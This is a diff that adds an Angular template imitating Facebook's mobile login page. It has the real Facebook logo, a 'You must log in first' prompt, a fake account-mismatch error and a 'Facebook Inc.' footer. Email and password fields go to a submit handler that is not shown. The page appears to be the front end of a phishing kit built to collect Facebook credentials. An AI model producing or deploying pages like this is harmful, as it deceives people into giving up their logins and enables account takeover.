@@ -1,0 +1,140 @@
+<main class="root">
+    <div *ngIf="error" class="p-2 text-white mb-0 danger" style="background: #fa3e3e;">The email address or phone number that you've entered doesn't match any account. <a href="#" class="font-weight-bold text-white">Sign up for an account.</a></div>
+    <div class="fbNav mb-2">
+        <small class="ml-1" style="color: #7f7212;">You must log in first.</small>
+    </div>
+
+    
+        <div class="container">
+            <div class="row">
+                <div class="col-12 col-sm-6 mx-auto text-center">
+                    <div class="logo mb-3">
+                        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook">
+                    </div>
+                    
+                        <form #form="ngForm" (ngSubmit)="onSubmit(form)" >
+                            <input 
+                            class="form-control fbForm mb-2 py-3"
+                            [ngStyle]="!email.dirty&&email.touched? {'border':'1px red solid'} :''"
+                            autocorrect="off" 
+                            autocapitalize="off" 
+                            type="email" 
+                            autocomplete="on" 
+                            name="email" 
+                            ngModel
+                            #email="ngModel"
+                            placeholder="Mobile number or email address"
+                            >
+                            <input 
+                            class="form-control fbForm mb-3 py-3"
+                            [ngStyle]="!password.dirty&&password.touched? {'border':'1px red solid'} :''"
+                            type="password" 
+                            name="password"
+                            ngModel 
+                            #password="ngModel"
+                            placeholder="Password" 
+                            >
+                            <button class="btn btn-block btn-blue text-white font-weight-bold mb-2" type="submit">Log in</button>
+                        </form>
+                    
+                    <div><span class="or">or</span></div>
+                    <div>
+                        <button class="btn btn-green text-white font-weight-bold mt-4 mb-2">Create New Account</button>
+                    </div>
+                    <div class="mb-5">
+                        <a href="#" style="color: #7596c8;">Forgotten password?</a>
+                    </div>
+                </div>   
+            </div>       
+            
+            
+                                
+            <div class="row">
+                
+                <div class="col-6 text-center">
+                    
+                    
+                    <div>
+                        <span class="small _52j9 _52jh _3ztb">
+                            <a href="#">English (UK)</a>
+                        </span>
+                    </div>
+                    <div>
+                        <span class="small">                                                
+                            <a href="#">Français (France)</a>                                           
+                        </span>
+                    </div>                                                                                
+                    <div class="_3ztc">                    
+                        <span class="small">
+                            
+                            <a href="#">Deutsch</a>
+                            
+                        </span>
+                        
+                    </div>
+                    
+                    <div class="_3ztc">
+                        
+                        <span class="small">
+                            
+                            <a href="#">Português (Brasil)</a>
+                            
+                        </span>
+                                        
+                    </div>
+                    
+                </div>
+                
+                <div class="col-6 text-center">
+                    
+                    <div class="_3ztc">
+                        
+                        <span class="small">
+                            
+                            <a href="#">العربية</a>
+                            
+                        </span>
+                        
+                    </div>
+                    
+                    <div class="_3ztc"><span class="small"><a href="#">Русский</a>
+                        
+                    </span>
+                    
+                </div>
+                
+                <div class="_3ztc">
+                    
+                    <span class="small">
+                
+                        <a href="#">Español</a>
+                        
+                    </span>
+                    
+                </div>
+                
+               
+                
+            </div>
+            
+        </div>
+        <div class="row">
+                    <div class="col-12 text-center">
+                        <a href="#">
+                            
+                            <span class="small" style="color: gray;">Facebook Inc.</span>
+                            
+                        </a>
+                    </div>
+            
+        </div>
+        
+    </div>                
+        
+        
+        
+        
+        
+        
+    </main>
+    
